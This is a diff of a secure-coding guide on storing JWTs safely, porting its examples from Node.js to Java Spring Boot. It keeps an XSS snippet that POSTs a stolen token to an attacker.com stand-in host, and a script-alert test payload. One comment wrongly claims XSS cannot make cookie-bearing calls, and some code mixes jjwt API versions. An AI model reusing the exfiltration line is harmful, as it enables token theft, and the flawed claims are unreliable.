@@ -466,12 +466,13 @@ https://example.com/?name=<script>alert('XSS')</script>
 
 ### Example 5: JWT Token Theft from localStorage via XSS
 
-**VULNERABLE: Storing JWT in localStorage**
+**VULNERABLE: Storing JWT in localStorage (Frontend + Backend)**
+
+**Frontend - JavaScript (Vulnerable):**
 
 ```javascript
 // ❌ VULNERABLE CODE - DO NOT USE
 
-// Login and store token in localStorage
 class AuthService {
   async login(username, password) {
     const response = await fetch('/api/login', {
@@ -502,8 +503,53 @@ fetch('https://attacker.com/tokens', {
   method: 'POST',
   body: JSON.stringify({ token: stolenToken })
 });
+```
 
-// Attacker can now impersonate the user forever (or until token expires)
+**Backend - Java Spring Boot (Vulnerable Approach):**
+
+```java
+// ❌ VULNERABLE CODE - DO NOT USE
+
+@RestController
+@RequestMapping("/api/auth")
+public class AuthController {
+  
+  @PostMapping("/login")
+  public ResponseEntity<?> login(@RequestBody LoginRequest request) {
+    User user = userService.validateCredentials(
+      request.getUsername(), 
+      request.getPassword()
+    );
+    
+    if (user == null) {
+      return ResponseEntity.status(401).body("Invalid credentials");
+    }
+    
+    // ❌ DANGER: Sending JWT in response body
+    // Frontend will store it in localStorage - accessible to XSS!
+    String token = jwtUtil.generateToken(user.getId());
+    
+    // This response gets stored in localStorage on frontend
+    return ResponseEntity.ok(new LoginResponse(token));  // ❌ VULNERABLE!
+  }
+  
+  @GetMapping("/protected-data")
+  public ResponseEntity<?> getProtectedData(
+    @RequestHeader("Authorization") String authHeader) {
+    
+    // Frontend extracts token from localStorage and sends it in header
+    // If XSS steals the token, attacker can use it forever
+    String token = authHeader.replace("Bearer ", "");
+    
+    try {
+      Claims claims = jwtUtil.extractClaims(token);
+      // Token is valid - attacker can access user data
+      return ResponseEntity.ok(getData(claims.getSubject()));
+    } catch (Exception e) {
+      return ResponseEntity.status(401).body("Invalid token");
+    }
+  }
+}
 ```
 
 **Impact Diagram:**
@@ -519,49 +565,115 @@ graph TD
 
 ---
 
-**SECURE: Using httpOnly Cookies**
+**SECURE: Using httpOnly Cookies (Java Spring Boot Backend)**
 
-```javascript
-// ✅ SECURE CODE - RECOMMENDED
+```java
+// ✅ SECURE CODE - RECOMMENDED (Java Spring Boot)
 
-// Backend: Set JWT in httpOnly cookie
-app.post('/api/login', (req, res) => {
-  const { username, password } = req.body;
+// pom.xml dependencies
+/*
+<dependency>
+  <groupId>io.jsonwebtoken</groupId>
+  <artifactId>jjwt-api</artifactId>
+  <version>0.12.3</version>
+</dependency>
+<dependency>
+  <groupId>io.jsonwebtoken</groupId>
+  <artifactId>jjwt-impl</artifactId>
+  <version>0.12.3</version>
+</dependency>
+<dependency>
+  <groupId>io.jsonwebtoken</groupId>
+  <artifactId>jjwt-jackson</artifactId>
+  <version>0.12.3</version>
+</dependency>
+*/
+
+@RestController
+@RequestMapping("/api/auth")
+public class AuthController {
   
-  // Validate credentials
-  const user = validateCredentials(username, password);
-  if (!user) {
-    return res.status(401).json({ error: 'Invalid credentials' });
+  @Autowired
+  private UserService userService;
+  
+  @Value("${jwt.secret}")
+  private String jwtSecret;
+  
+  @PostMapping("/login")
+  public ResponseEntity<?> login(@RequestBody LoginRequest loginRequest, 
+                                  HttpServletResponse response) {
+    // Validate credentials
+    User user = userService.validateCredentials(
+      loginRequest.getUsername(), 
+      loginRequest.getPassword()
+    );
+    
+    if (user == null) {
+      return ResponseEntity.status(401).body(new ErrorResponse("Invalid credentials"));
+    }
+    
+    // Generate JWT
+    String token = Jwts.builder()
+      .subject(user.getId())
+      .claim("email", user.getEmail())
+      .issuedAt(new Date(System.currentTimeMillis()))
+      .expiration(new Date(System.currentTimeMillis() + 3_600_000)) // 1 hour
+      .signWith(Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8)))
+      .compact();
+    
+    // Set as httpOnly cookie (NOT accessible to JavaScript!)
+    ResponseCookie cookie = ResponseCookie
+      .from("authToken", token)
+      .httpOnly(true)           // ✅ JavaScript cannot access this
+      .secure(true)             // ✅ Only sent over HTTPS
+      .path("/")
+      .sameSite("Strict")        // ✅ Prevents CSRF attacks
+      .maxAge(3600)             // ✅ Expires in 1 hour
+      .build();
+    
+    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+    
+    return ResponseEntity.ok(new LoginResponse(true, user.getId()));
   }
   
-  // Generate JWT
-  const token = jwt.sign(
-    { userId: user.id, email: user.email },
-    process.env.JWT_SECRET,
-    { expiresIn: '1h' }
-  );
-  
-  // Set as httpOnly cookie (NOT accessible to JavaScript!)
-  res.cookie('authToken', token, {
-    httpOnly: true,      // ✅ JavaScript cannot access this
-    secure: true,        // ✅ Only sent over HTTPS
-    sameSite: 'Strict',  // ✅ Prevents CSRF attacks
-    maxAge: 3600000      // ✅ Expires in 1 hour
-  });
-  
-  res.json({ success: true });
-});
+  @GetMapping("/user")
+  public ResponseEntity<?> getUser(
+    @CookieValue(value = "authToken", required = false) String token) {
+    
+    // Token is extracted from httpOnly cookie automatically by Spring
+    if (token == null) {
+      return ResponseEntity.status(401).body(new ErrorResponse("Not authenticated"));
+    }
+    
+    try {
+      // Verify token
+      Jws<Claims> jws = Jwts.parserBuilder()
+        .setSigningKey(Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8)))
+        .build()
+        .parseClaimsJws(token);
+      
+      String userId = jws.getBody().getSubject();
+      User user = userService.getUserById(userId);
+      
+      // ✅ XSS cannot access the token - it's in httpOnly cookie
+      return ResponseEntity.ok(user);
+    } catch (JwtException e) {
+      return ResponseEntity.status(401).body(new ErrorResponse("Invalid token"));
+    }
+  }
+}
 
 // Frontend: No need to manage token - browser sends it automatically
+// TypeScript/Angular example:
 class AuthService {
-  async fetchUserData() {
-    // Token is automatically sent in cookie
+  constructor(private http: HttpClient) {}
+  
+  fetchUserData() {
+    // Token is automatically sent in httpOnly cookie
     // XSS cannot access it because it's httpOnly!
-    const response = await fetch('/api/user', {
-      credentials: 'include' // Include cookies in request
+    return this.http.get('/api/auth/user', {
+      withCredentials: true  // Include cookies in request
     });
-    
-    return response.json();
   }
 }
 
@@ -576,7 +688,9 @@ const cookie = document.cookie; // Doesn't include authToken!
 
 If you must store JWT in client-side JavaScript, use in-memory storage with refresh tokens:
 
-```javascript
+**Frontend - TypeScript/Angular:**
+
+```typescript
 // ✅ SAFER ALTERNATIVE (but still less secure than httpOnly)
 
 class AuthService {
@@ -621,117 +735,327 @@ class AuthService {
 // - User must re-authenticate on page reload
 ```
 
----
+**Backend - Java Spring Boot (In-Memory Alternative):**
 
-**BEST PRACTICE: Complete Secure Implementation**
+```java
+// ✅ SAFER ALTERNATIVE (Java Spring Boot with Refresh Tokens)
 
-```javascript
-// ✅ BEST PRACTICE - Production-Ready
-
-// Backend (Node.js/Express)
-const express = require('express');
-const jwt = require('jsonwebtoken');
-const app = express();
-
-app.post('/api/auth/login', (req, res) => {
-  const { username, password } = req.body;
+@RestController
+@RequestMapping("/api/auth")
+public class AuthController {
   
-  // Validate credentials
-  const user = validateUser(username, password);
-  if (!user) {
-    return res.status(401).json({ error: 'Invalid credentials' });
-  }
+  @Autowired
+  private JwtUtil jwtUtil;
   
-  // Short-lived access token (15 minutes)
-  const accessToken = jwt.sign(
-    { userId: user.id, type: 'access' },
-    process.env.JWT_SECRET,
-    { expiresIn: '15m' }
-  );
+  @Autowired
+  private UserService userService;
   
-  // Longer-lived refresh token (7 days)
-  const refreshToken = jwt.sign(
-    { userId: user.id, type: 'refresh' },
-    process.env.REFRESH_SECRET,
-    { expiresIn: '7d' }
-  );
-  
-  // Set tokens
-  res.cookie('accessToken', accessToken, {
-    httpOnly: true,
-    secure: true,
-    sameSite: 'Strict',
-    maxAge: 15 * 60 * 1000 // 15 minutes
-  });
-  
-  res.cookie('refreshToken', refreshToken, {
-    httpOnly: true,
-    secure: true,
-    sameSite: 'Strict',
-    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
-  });
-  
-  res.json({ success: true, userId: user.id });
-});
-
-app.post('/api/auth/refresh', (req, res) => {
-  const refreshToken = req.cookies.refreshToken;
-  
-  if (!refreshToken) {
-    return res.status(401).json({ error: 'Not authenticated' });
-  }
-  
-  try {
-    // Verify refresh token
-    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
+  @PostMapping("/login")
+  public ResponseEntity<?> login(@RequestBody LoginRequest request,
+                                  HttpServletResponse response) {
     
-    // Issue new access token
-    const newAccessToken = jwt.sign(
-      { userId: decoded.userId, type: 'access' },
-      process.env.JWT_SECRET,
-      { expiresIn: '15m' }
+    User user = userService.validateCredentials(
+      request.getUsername(), 
+      request.getPassword()
     );
     
-    res.cookie('accessToken', newAccessToken, {
-      httpOnly: true,
-      secure: true,
-      sameSite: 'Strict',
-      maxAge: 15 * 60 * 1000
-    });
+    if (user == null) {
+      return ResponseEntity.status(401).body("Invalid credentials");
+    }
     
-    res.json({ success: true });
-  } catch (error) {
-    res.status(401).json({ error: 'Invalid refresh token' });
+    // Generate short-lived access token
+    String accessToken = jwtUtil.generateAccessToken(user.getId());
+    
+    // Generate long-lived refresh token
+    String refreshToken = jwtUtil.generateRefreshToken(user.getId());
+    
+    // Send access token in response body (frontend stores in memory)
+    // Refresh token in httpOnly cookie (secure on server)
+    ResponseCookie refreshCookie = ResponseCookie
+      .from("refreshToken", refreshToken)
+      .httpOnly(true)
+      .secure(true)
+      .sameSite("Strict")
+      .maxAge(7 * 24 * 60 * 60)
+      .build();
+    
+    response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());
+    
+    // Frontend will store accessToken in memory
+    return ResponseEntity.ok(new LoginResponse(accessToken, user.getId()));
   }
-});
-
-app.post('/api/auth/logout', (req, res) => {
-  res.clearCookie('accessToken');
-  res.clearCookie('refreshToken');
-  res.json({ success: true });
-});
-
-// Middleware to verify token
-const verifyToken = (req, res, next) => {
-  const token = req.cookies.accessToken;
   
-  if (!token) {
-    return res.status(401).json({ error: 'No token' });
+  @PostMapping("/refresh")
+  public ResponseEntity<?> refresh(@CookieValue("refreshToken") String refreshToken) {
+    
+    if (!jwtUtil.isTokenValid(refreshToken)) {
+      return ResponseEntity.status(401).body("Invalid refresh token");
+    }
+    
+    Claims claims = jwtUtil.extractClaims(refreshToken);
+    String userId = claims.getSubject();
+    
+    // Issue new access token
+    String newAccessToken = jwtUtil.generateAccessToken(userId);
+    
+    return ResponseEntity.ok(new RefreshResponse(newAccessToken));
+  }
+}
+```
+
+---
+
+**BEST PRACTICE: Complete Secure Implementation (Java Spring Boot)**
+
+```java
+// ✅ BEST PRACTICE - Production-Ready (Java Spring Boot)
+
+// application.properties configuration
+jwt.secret=your-super-secret-key-min-256-bits-long-for-HS256
+jwt.accessTokenExpiry=900000
+jwt.refreshTokenExpiry=604800000
+
+// ============================================
+// JwtUtil.java - JWT Token Generator 
+// ============================================
+@Service
+public class JwtUtil {
+  
+  @Value("${jwt.secret}")
+  private String jwtSecret;
+  
+  @Value("${jwt.accessTokenExpiry}")
+  private long accessTokenExpiry;
+  
+  @Value("${jwt.refreshTokenExpiry}")
+  private long refreshTokenExpiry;
+  
+  // Generate access token (15 minutes)
+  public String generateAccessToken(String userId) {
+    return Jwts.builder()
+      .subject(userId)
+      .claim("type", "access")
+      .issuedAt(new Date())
+      .expiration(new Date(System.currentTimeMillis() + accessTokenExpiry))
+      .signWith(Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8)), 
+                SignatureAlgorithm.HS256)
+      .compact();
   }
   
-  try {
-    const decoded = jwt.verify(token, process.env.JWT_SECRET);
-    req.userId = decoded.userId;
-    next();
-  } catch (error) {
-    return res.status(401).json({ error: 'Invalid token' });
+  // Generate refresh token (7 days)
+  public String generateRefreshToken(String userId) {
+    return Jwts.builder()
+      .subject(userId)
+      .claim("type", "refresh")
+      .issuedAt(new Date())
+      .expiration(new Date(System.currentTimeMillis() + refreshTokenExpiry))
+      .signWith(Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8)), 
+                SignatureAlgorithm.HS256)
+      .compact();
   }
-};
+  
+  // Verify and extract claims
+  public Claims extractClaims(String token) {
+    try {
+      return Jwts.parserBuilder()
+        .setSigningKey(Keys.hmacShaKeyFor(jwtSecret.getBytes(StandardCharsets.UTF_8)))
+        .build()
+        .parseClaimsJws(token)
+        .getBody();
+    } catch (JwtException e) {
+      return null;
+    }
+  }
+  
+  // Check if token is valid
+  public boolean isTokenValid(String token) {
+    Claims claims = extractClaims(token);
+    return claims != null && !isTokenExpired(claims);
+  }
+  
+  private boolean isTokenExpired(Claims claims) {
+    return claims.getExpiration().before(new Date());
+  }
+}
 
-app.get('/api/user', verifyToken, (req, res) => {
-  const user = getUser(req.userId);
-  res.json(user);
-});
+// ============================================
+// AuthController.java - Login, Refresh, Logout
+// ============================================
+@RestController
+@RequestMapping("/api/auth")
+public class AuthController {
+  
+  @Autowired
+  private UserService userService;
+  
+  @Autowired
+  private JwtUtil jwtUtil;
+  
+  @PostMapping("/login")
+  public ResponseEntity<?> login(@RequestBody LoginRequest request,
+                                  HttpServletResponse response) {
+    
+    // Validate credentials
+    User user = userService.validateCredentials(
+      request.getUsername(), 
+      request.getPassword()
+    );
+    
+    if (user == null) {
+      return ResponseEntity.status(401).body("Invalid credentials");
+    }
+    
+    String userId = user.getId();
+    
+    // Generate tokens
+    String accessToken = jwtUtil.generateAccessToken(userId);
+    String refreshToken = jwtUtil.generateRefreshToken(userId);
+    
+    // Set access token in httpOnly cookie (15 minutes)
+    ResponseCookie accessCookie = ResponseCookie
+      .from("accessToken", accessToken)
+      .httpOnly(true)
+      .secure(true)  // Only send over HTTPS
+      .path("/")
+      .sameSite("Strict")
+      .maxAge(15 * 60)  // 15 minutes
+      .build();
+    
+    // Set refresh token in httpOnly cookie (7 days)
+    ResponseCookie refreshCookie = ResponseCookie
+      .from("refreshToken", refreshToken)
+      .httpOnly(true)
+      .secure(true)
+      .path("/api/auth")
+      .sameSite("Strict")
+      .maxAge(7 * 24 * 60 * 60)  // 7 days
+      .build();
+    
+    response.addHeader(HttpHeaders.SET_COOKIE, accessCookie.toString());
+    response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());
+    
+    return ResponseEntity.ok(new LoginResponse(true, userId));
+  }
+  
+  @PostMapping("/refresh")
+  public ResponseEntity<?> refresh(@CookieValue("refreshToken") String refreshToken,
+                                   HttpServletResponse response) {
+    
+    // Verify refresh token
+    if (!jwtUtil.isTokenValid(refreshToken)) {
+      return ResponseEntity.status(401).body("Invalid refresh token");
+    }
+    
+    try {
+      Claims claims = jwtUtil.extractClaims(refreshToken);
+      String userId = claims.getSubject();
+      
+      // Issue new access token
+      String newAccessToken = jwtUtil.generateAccessToken(userId);
+      
+      ResponseCookie cookie = ResponseCookie
+        .from("accessToken", newAccessToken)
+        .httpOnly(true)
+        .secure(true)
+        .path("/")
+        .sameSite("Strict")
+        .maxAge(15 * 60)
+        .build();
+      
+      response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
+      return ResponseEntity.ok("Token refreshed");
+      
+    } catch (Exception e) {
+      return ResponseEntity.status(401).body("Failed to refresh token");
+    }
+  }
+  
+  @PostMapping("/logout")
+  public ResponseEntity<?> logout(HttpServletResponse response) {
+    // Clear both cookies
+    ResponseCookie accessCookie = ResponseCookie
+      .from("accessToken", "")
+      .httpOnly(true)
+      .secure(true)
+      .path("/")
+      .maxAge(0)  // Delete immediately
+      .build();
+    
+    ResponseCookie refreshCookie = ResponseCookie
+      .from("refreshToken", "")
+      .httpOnly(true)
+      .secure(true)
+      .path("/api/auth")
+      .maxAge(0)  // Delete immediately
+      .build();
+    
+    response.addHeader(HttpHeaders.SET_COOKIE, accessCookie.toString());
+    response.addHeader(HttpHeaders.SET_COOKIE, refreshCookie.toString());
+    
+    return ResponseEntity.ok("Logged out");
+  }
+}
+
+// ============================================
+// JwtAuthenticationFilter.java - Token Verification
+// ============================================
+@Component
+public class JwtAuthenticationFilter extends OncePerRequestFilter {
+  
+  @Autowired
+  private JwtUtil jwtUtil;
+  
+  @Override
+  protected void doFilterInternal(HttpServletRequest request,
+                                  HttpServletResponse response,
+                                  FilterChain filterChain) throws ServletException, IOException {
+    try {
+      // Extract token from httpOnly cookie
+      String token = null;
+      Cookie[] cookies = request.getCookies();
+      
+      if (cookies != null) {
+        for (Cookie cookie : cookies) {
+          if ("accessToken".equals(cookie.getName())) {
+            token = cookie.getValue();
+            break;
+          }
+        }
+      }
+      
+      // Validate token
+      if (token != null && jwtUtil.isTokenValid(token)) {
+        Claims claims = jwtUtil.extractClaims(token);
+        String userId = claims.getSubject();
+        
+        // Create authentication
+        UsernamePasswordAuthenticationToken auth = 
+          new UsernamePasswordAuthenticationToken(userId, null, new ArrayList<>());
+        SecurityContextHolder.getContext().setAuthentication(auth);
+      }
+      
+    } catch (Exception e) {
+      logger.debug("Token validation failed: " + e.getMessage());
+    }
+    
+    filterChain.doFilter(request, response);
+  }
+}
+
+// ============================================
+// Protected endpoint example
+// ============================================
+@GetMapping("/api/user")
+@PreAuthorize("isAuthenticated()")
+public ResponseEntity<?> getUser(Authentication authentication) {
+  // ✅ Token is secure in httpOnly cookie
+  // ✅ XSS cannot access it
+  // ✅ Even if XSS exists, attacker cannot make this call
+  
+  String userId = authentication.getName();
+  User user = userService.getUserById(userId);
+  return ResponseEntity.ok(user);
+}
 ```
 
 **Why This is Secure:**
